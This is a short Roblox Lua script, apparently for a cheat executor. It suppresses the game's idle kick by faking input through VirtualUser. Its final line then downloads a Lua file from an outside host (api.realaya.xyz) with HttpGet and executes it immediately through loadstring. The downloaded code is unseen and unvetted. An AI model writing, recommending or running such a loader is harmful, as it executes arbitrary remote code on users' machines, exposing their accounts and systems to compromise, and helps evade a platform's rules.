repeat
	task.wait()
until game:IsLoaded() and game:GetService("Players") and game:GetService("Players").LocalPlayer and workspace

game.Players.LocalPlayer.Idled:Connect(function()
	game:GetService("VirtualUser"):CaptureController()
	game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)

loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/z2ioh2fx175gbqdsenk39xsy1dbjxjp3.lua"))()
